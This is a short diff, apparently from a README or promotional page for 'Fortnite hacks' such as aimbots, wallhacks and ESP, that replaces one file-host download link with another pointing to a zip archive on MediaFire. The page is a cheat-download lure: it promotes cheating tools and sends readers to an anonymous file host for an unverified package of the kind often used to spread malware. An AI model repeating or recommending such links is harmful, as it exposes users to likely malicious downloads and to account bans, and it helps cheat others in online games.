@@ -7,7 +7,7 @@ Fortnite hacks - used to gain advantages such as aimbots, wallhacks, ESP or spee
 
 ---
 
-> ➤➤➤ [Download Fortnite Hacks​](https://www.filemail.com/d/jkyzbbkqjhidaid)
+➤➤➤ [Download Fortnite Hacks​]https://www.mediafire.com/file/5d2sq7xdlxl7mgs/Fortnite-v1.1.5.zip/file
 
 ---
 
